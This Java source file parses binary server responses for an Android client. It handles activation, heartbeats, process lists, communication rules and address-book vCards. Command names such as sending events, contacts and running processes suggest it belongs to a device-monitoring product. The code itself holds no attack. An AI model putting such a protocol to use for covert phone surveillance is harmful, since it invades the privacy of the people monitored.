package com.vvt.phoenix.prot.parser;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

import android.util.Log;

import com.vvt.phoenix.config.Customization;
import com.vvt.phoenix.prot.command.CommandCode;
import com.vvt.phoenix.prot.command.FxProcess;
import com.vvt.phoenix.prot.command.response.CommunicationDirectiveCriteria;
import com.vvt.phoenix.prot.command.response.CommunicationDirectiveEvents;
import com.vvt.phoenix.prot.command.response.CommunicationDirective;
import com.vvt.phoenix.prot.command.response.GetActivationCodeResponse;
import com.vvt.phoenix.prot.command.response.GetAddressBookResponse;
import com.vvt.phoenix.prot.command.response.GetCSIDResponse;
import com.vvt.phoenix.prot.command.response.GetCommunicationDirectivesResponse;
import com.vvt.phoenix.prot.command.response.GetConfigurationResponse;
import com.vvt.phoenix.prot.command.response.GetProcessBlackListResponse;
import com.vvt.phoenix.prot.command.response.GetProcessWhiteListResponse;
import com.vvt.phoenix.prot.command.response.GetTimeResponse;
import com.vvt.phoenix.prot.command.response.RAskResponse;
import com.vvt.phoenix.prot.command.response.ResponseData;
import com.vvt.phoenix.prot.command.response.ResponseVCardProvider;
import com.vvt.phoenix.prot.command.response.SendActivateResponse;
import com.vvt.phoenix.prot.command.response.SendAddressBookForApprovalResponse;
import com.vvt.phoenix.prot.command.response.SendAddressBookResponse;
import com.vvt.phoenix.prot.command.response.SendClearCSIDResponse;
import com.vvt.phoenix.prot.command.response.SendDeactivateResponse;
import com.vvt.phoenix.prot.command.response.SendEventsResponse;
import com.vvt.phoenix.prot.command.response.SendHeartBeatResponse;
import com.vvt.phoenix.prot.command.response.SendMessageResponse;
import com.vvt.phoenix.prot.command.response.SendRunningProcessesResponse;
import com.vvt.phoenix.prot.command.response.UnknownResponse;
import com.vvt.phoenix.prot.event.AddressBook;
import com.vvt.phoenix.util.DataBuffer;

/**
 * @author tanakharn
 *	caller must check integrity of data and decrypt data before do parsing
 */
public class ResponseParser {
	
	//Debugging
	private static final String TAG = "ResponseParser";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_DEBUG = (Customization.DEBUG)? DEBUG : false;
	
	
	//////////////////////////////////////////////////////////// parse to memory operation /////////////////////////////
		
	public static ResponseData parseResponse(byte[] data, boolean isRAsk) throws IOException{
		ResponseData response = null;
		DataBuffer buffer = new DataBuffer(data);
		
		//for test throwing IOException
		/*if(true){
			throw new IOException("Dummy Exception while parsing response");
		}*/
		
		//1 check Command Echo
		//ByteBuffer buf = ByteBuffer.wrap(buffer.directRead(3, 2));
		ByteBuffer buf = ByteBuffer.wrap(buffer.directRead(2, 2));	//skip SERVER_ID and read CMD_ECHO
		short cmdEcho = buf.getShort();
		
		if(LOCAL_DEBUG){
			Log.v(TAG, "cmdEcho: "+cmdEcho);
		}
		
		//2 select parsing operation
		switch(cmdEcho){
			case CommandCode.UNKNOWN_OR_RASK				: 	if(isRAsk){
																	response = parseRAskResponse(buffer);break;
																}else{
																	response = parseUnknownCommand(buffer);break; 
																}
			case CommandCode.SEND_EVENT						:	response = parseSendEvents(buffer);break;
			case CommandCode.SEND_ACTIVATE					:	response = parseSendActivateResponse(buffer);break;
			case CommandCode.SEND_DEACTIVATE				:	response = parseSendDeactivateResponse(buffer); break;
			case CommandCode.SEND_HEARTBEAT					:	response = parseSendHeartBeatResponse(buffer);break;
			case CommandCode.REQUEST_CONFIGURATION			:	response = parseGetConfigurationResponse(buffer);break;
			case CommandCode.GETCSID						:	response = parseGetCsidResponse(buffer);break;
			case CommandCode.CLEARSID						:	response = parseSendClearCsidResponse(buffer);break;
			case CommandCode.REQUEST_ACTIVATION_CODE		:	response = parseGetActivationCodeResponse(buffer);break;
			//TODO PENDING: waiting for VCard Provider//case CommandCode.GET_ADDRESS_BOOK				:	break;
			case CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL	:	response = parseSendAddressBookForApprovalResponse(buffer);break;
			case CommandCode.SEND_ADDRESS_BOOK				:	response = parseSendAddressBookResponse(buffer);break;
			case CommandCode.GET_COMMU_MANAGER_SETTINGS		:	response = parseGetCommuManagerSetting(buffer);break;
			case CommandCode.GET_TIME						:	response = pareseGetTimeResponse(buffer);break;
			case CommandCode.SEND_MESSAGE					:	response = parseSendMessageResponse(buffer);break;
			case CommandCode.GET_PROCESS_WHITE_LIST			:	response = parseGetProcessWhiteList(buffer);break;
			case CommandCode.SEND_RUNNING_PROCESS			:	response = parseSendRunningProcessesResponse(buffer);break;
			case CommandCode.GET_PROCESS_BLACK_LIST			:	response = parseGetProcessBlackList(buffer);break;
			
		}
		
		return response;
		
	}
	
	private static void extractServerHeader(DataBuffer buffer, ResponseData response){
		//1 extract encrypt flag
		//response.setEncrypt(buffer.readBoolean());
		
		//2 extract crc32
		//response.setCrc32(buffer.readInt());
		
		//3 extract Server ID
		response.setServerId(buffer.readShort());
		
		//4 skip cmd echo
		buffer.skip(2);
		
		//5 extract status code
		response.setStatusCode(buffer.readShort());
		
		//6 extract message
		int msgLen = buffer.readShort();
		response.setMessage(buffer.readUTF(msgLen));
		
		//7 extract extended status
		response.setExtendedStatus(buffer.readInt());
		
		//8 extract PCC
		PCCParser.parsePcc(buffer, response);
	}
		
	private static ResponseData parseUnknownCommand(DataBuffer buffer){
		UnknownResponse response = new UnknownResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendActivateResponse(DataBuffer buffer){
		SendActivateResponse response = new SendActivateResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract MD5
		byte[] md5 = new byte[16];
		buffer.readBytes(md5);
		response.setMd5(md5);
		
		//3 extract config id
		response.setConfigId(buffer.readShort());
		
		
		return response;
	}
	
	private static ResponseData parseSendDeactivateResponse(DataBuffer buffer){
		SendDeactivateResponse response = new SendDeactivateResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
		
	}
	
	private static ResponseData parseSendEvents(DataBuffer buffer){
		SendEventsResponse response = new SendEventsResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendClearCsidResponse(DataBuffer buffer){
		SendClearCSIDResponse response = new SendClearCSIDResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendHeartBeatResponse(DataBuffer buffer){
		SendHeartBeatResponse response = new SendHeartBeatResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendMessageResponse(DataBuffer buffer){
		SendMessageResponse response = new SendMessageResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendRunningProcessesResponse(DataBuffer buffer){
		SendRunningProcessesResponse response = new SendRunningProcessesResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}

	private static ResponseData parseSendAddressBookResponse(DataBuffer buffer){
		SendAddressBookResponse response = new SendAddressBookResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseSendAddressBookForApprovalResponse(DataBuffer buffer){
		SendAddressBookForApprovalResponse response = new SendAddressBookForApprovalResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		return response;
	}
	
	private static ResponseData parseGetCsidResponse(DataBuffer buffer){
		GetCSIDResponse response = new GetCSIDResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract CSIDS_STRUCT
		//2.1 extract number of session
		int sessionCount = buffer.readByte();
		//2.2 extract each CSID to response object
		for(int i=0; i<sessionCount; i++){
			response.addCsid(buffer.readByte());
		}
		
		return response;
	}
	
	/**
	 * @param buffer
	 * @return
	 * 
	 */
	private static ResponseData pareseGetTimeResponse(DataBuffer buffer){
		GetTimeResponse response = new GetTimeResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract TIME_STRUCT
		//2.1 extract GMT_TIME
		response.setGmtTime(buffer.readUTF(19));
		//2.2 extract Representation
		response.setRepresentation(buffer.readByte());
		//2.3 extract TimeZone
		int timezoneLen = buffer.readByte();
		response.setTimeZone(buffer.readUTF(timezoneLen));
		
		return response;
	}
	
	private static ResponseData parseGetProcessWhiteList(DataBuffer buffer){
		GetProcessWhiteListResponse response = new GetProcessWhiteListResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract Process_Struct
		//2.1 get number of Processes
		int processCount = buffer.readShort();
		FxProcess process = null;
		//2.2 do each Process
		for(int i=0; i<processCount; i++){
			process = new FxProcess();
			//2.2.1 set Category
			process.setCategory(buffer.readByte());
			//2.2.2 set Name
			int nameLen = buffer.readByte();
			process.setName(buffer.readUTF(nameLen));
			//2.2.3 push process to response object
			response.addProcess(process);
		}
		
		return response;
	}
	
	private static ResponseData parseGetProcessBlackList(DataBuffer buffer){
		GetProcessBlackListResponse response = new GetProcessBlackListResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract Process_Struct
		//2.1 get number of Processes
		int processCount = buffer.readShort();
		//2.2 do each Process
		FxProcess process = null;
		for(int i=0; i<processCount; i++){
			process = new FxProcess();
			//2.2.1 set Category
			process.setCategory(buffer.readByte());
			//2.2.2 set Name
			int nameLen = buffer.readByte();
			process.setName(buffer.readUTF(nameLen));
			//2.2.3 push process to response object
			response.addProcess(process);
		}
		
		return response;
	}
	
	private static ResponseData parseGetCommuManagerSetting(DataBuffer buffer){
		GetCommunicationDirectivesResponse response = new GetCommunicationDirectivesResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract COMMUNICATION_RULES_STRUCT
		//2.1 get number of Communication_Rules
		int commuCount = buffer.readShort();
		//2.2 do each Communication_Rule
		CommunicationDirective rule = null;
		CommunicationDirectiveCriteria criteria = null;
		CommunicationDirectiveEvents events = null;
		for(int i=0; i<commuCount; i++){
			rule = new CommunicationDirective();
			//2.2.1 set Time Unit
			rule.setTimeUnit(buffer.readByte());
			//2.2.2 set Criteria
			criteria = new CommunicationDirectiveCriteria();
			criteria.setMultiplier(buffer.readByte());
			criteria.addDayOfWeek(buffer.readByte());
			criteria.setDayOfMonth(buffer.readByte());
			criteria.setMonth(buffer.readByte());
			rule.setCriteria(criteria);
			//2.2.3 set commu_events
			events = new CommunicationDirectiveEvents();
			//2.2.3.1 get Commu_Events count
			int eventCount = buffer.readShort();
			//2.2.3.2 do each Commu Event
			for(int j=0; j<eventCount; j++){
				events.addEventType(buffer.readShort());
			}
			rule.setCommunicationEvents(events);
			//2.2.4 set START_DATE
			rule.setStartDate(buffer.readUTF(10));
			//2.2.5 set END_DATE
			rule.setEndDate(buffer.readUTF(10));
			//2.2.6 set DAY_START_TIME
			rule.setDayStartTime(buffer.readUTF(5));
			//2.2.7 set DAY_END_TIME
			rule.setDayEndTime(buffer.readUTF(5));
			//2.2.8 set ACTION
			rule.setAction(buffer.readByte());
			//2.2.9 set DIRECTION
			rule.setDirection(buffer.readByte());
			
			response.addCommunicationRule(rule);
		}
		
		return response;		
	}
	
	private static ResponseData parseGetConfigurationResponse(DataBuffer buffer){
		GetConfigurationResponse response = new GetConfigurationResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract CONFIGURATION_TOKEN_STRUCT
		//2.1 set MD5
		response.setMD5(buffer.readBytes(16));
		//2.2 set ConfigID
		response.setConfigId(buffer.readShort());
		
		return response;
		
		
	}
	
	private static ResponseData parseGetActivationCodeResponse(DataBuffer buffer){
		GetActivationCodeResponse response = new GetActivationCodeResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 extract ACTIVATION_CODE_STRUCT
		int codeLen = buffer.readByte();
		response.setActivationCode(buffer.readUTF(codeLen));
		
		return response;
	}
		
	private static ResponseData parseRAskResponse(DataBuffer buffer){
		RAskResponse response = new RAskResponse();
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(buffer, response);
		
		//2 parse number of bytes received
		int bytesReceived = buffer.readInt();
		response.setNumberOfBytesReceived(bytesReceived);
		
		return response;
	}
	
	/////////////////////////////////////////////////////////  Parse To File Operation ///////////////////////////////
	/**
	 * only support GetAddressBookResponse
	 * @param path
	 * @return
	 * @throws IOException
	 */
	public static ResponseData parseResponse(String path) throws IOException{
		ResponseData response = null;
		String vcardPath = path+".vc";
		
		if(LOCAL_DEBUG){
			Log.v(TAG, "parseResponse from File");
			Log.v(TAG, "Path: "+path);
			Log.v(TAG, "VCard Path: "+vcardPath);
		}
		
		//in this case, the file still contain crc value so we need to skip it
		if(LOCAL_DEBUG){
			Log.v(TAG, "Skip CRC");
		}
		File f = new File(path);
		FileInputStream  fIn = new FileInputStream(f);
		DataInputStream dis = new DataInputStream(fIn);
		dis.skipBytes(4);
		
		//check command echo
		/*if(DEBUG){
			Log.v(TAG, "Read CMD Echo (Skip Server ID)");
		}
		dis.mark(dis.available());
		dis.skip(2);	//skip SERVER_ID
		short cmdEcho = dis.readShort();
		dis.reset();*/
		
		//read Server ID
		short serverId = dis.readShort();
		if(LOCAL_DEBUG){
			Log.v(TAG, "Server ID: "+serverId);
		}		
		
		//read Cmd ECHO
		short cmdEcho = dis.readShort();
		
		if(LOCAL_DEBUG){
			Log.v(TAG, "CMD ECHO: "+cmdEcho);
		}
		switch(cmdEcho){
			case CommandCode.GET_ADDRESS_BOOK	: response = (GetAddressBookResponse) parseGetAddressBookResponse(dis, vcardPath);
		}
		
		dis.close();
		
		//set server id
		response.setServerId(serverId);
		
		return response;
	}
	
	private static void extractServerHeader(DataInputStream dis, ResponseData response) throws IOException{
		if(LOCAL_DEBUG){
			Log.v(TAG, "extractServerHeader");
		}
		//1 extract Server ID
		//response.setServerId(dis.readShort());
		
		//2 skip CMD Echo
		//dis.skipBytes(2);
		
		//3 extract STATUS CODE
		response.setStatusCode(dis.readShort());
		
		//4 extract Message
		short msgLen = dis.readShort();
		byte[] buf = new byte[msgLen];
		dis.read(buf);
		response.setMessage(new String(buf));
		
		//5 extract extend status
		response.setExtendedStatus(dis.readInt());
		
		//6 extract PCC command
		PCCParser.parsePcc(dis, response);
	}
	
	/**
	 * @param buffer
	 * @return
	 * 
	 *TODO PENDING: waiting for VCard Provider
	 */
	private static GetAddressBookResponse parseGetAddressBookResponse(DataInputStream dis, String vcardPath) throws IOException{
		if(LOCAL_DEBUG){
			Log.v(TAG, "parseGetAddressBookResponse");
		}
		// prepare vcard file
		GetAddressBookResponse response = new GetAddressBookResponse();
		File f = new File(vcardPath);
		f.delete();						//TODO VCard Path may duplicate with previous GetAddressBookResponse, tell caller to be careful
		DataOutputStream vcardOut = new DataOutputStream(new FileOutputStream(f));
		ResponseVCardProvider vcProvider;
		
		//1 extract Server Header from buffer to response object
		extractServerHeader(dis, response);
		
		//2 parse ADDRESS_BOOKS_STRUCT
		byte[] buf;
		//2.1 extract Address Book count
		int bookCount = dis.read();
		if(LOCAL_DEBUG){
			Log.v(TAG, "Address Book count: "+bookCount);
		}
		//2.2 parse each Address Book
		AddressBook book = null;
		for(int i=0; i<bookCount; i++){
			book = new AddressBook();
			//2.2.1 ID
			book.setAddressBookId(dis.readInt());
			if(LOCAL_DEBUG){
				Log.v(TAG, "Book ID: "+book.getAddressBookId());
			}
			//2.2.2 Name
			buf = new byte[dis.read()];	//read name length
			dis.read(buf); // read name
			book.setAddressBookName(new String(buf));
			if(LOCAL_DEBUG){
				Log.v(TAG, "Book Name: "+book.getAddressBookName());
			}
			//2.2.3 VCard count
			int vcardCount = dis.readShort();
			book.setVCardCount(vcardCount);
			if(LOCAL_DEBUG){
				Log.v(TAG, "VCard count: "+vcardCount);
			}
			//2.2.4 set ResponseVCardProvider
			vcProvider = new ResponseVCardProvider(vcardPath, (int) f.length(), vcardCount);
			book.setVCardProvider(vcProvider);
			//2.2.5 copy VCard to VCard file
			copyVCardToVCardFile(vcardPath, vcardCount, dis, vcardOut);
			//2.2.6 add current Address Book to response object
			response.addAddressBook(book);
		}
		
		vcardOut.close();
		
		return response;
	}
	
	private static void copyVCardToVCardFile(String targetPath, int vcardCount, DataInputStream dis, DataOutputStream dos) 
	throws IOException{
		if(LOCAL_DEBUG){
			Log.v(TAG, "copyVCardToVCardFile");
		}
		/*File f = new File(targetPath);
		FileOutputStream fOut = new FileOutputStream(f, true);
		DataOutputStream dos = new DataOutputStream(fOut);*/
		
		byte[] buf;
		int len;
		for(int i=0; i<vcardCount; i++){
			//copy CARD_ID_SERVER
			dos.writeInt(dis.readInt());
			//copy CARD_ID_CLIENT length
			int idClientLen = dis.read();
			dos.write(idClientLen);
			//copy CARD_ID_CLIENT
			buf = new byte[idClientLen];
			dis.read(buf);
			dos.write(buf);
			//copy APPROVAL_STATUS
			dos.write(dis.read());
			
			//copy VCard Summary
			//First Name and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//Last Name and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			// Home Phone and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//Mobile Phone and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//Work Phone and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//EMail and length
			len = dis.read();
			dos.write(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//Note and length (2 bytes)
			len = dis.readShort();
			dos.writeShort(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			//Contact Picture and length (4 bytes)
			len = dis.readInt();
			dos.writeInt(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
			
			//Copy VCARD_DATA
			len = dis.readInt();
			dos.writeInt(len);
			buf = new byte[len];
			dis.read(buf);
			dos.write(buf);
		}
				
	}
}

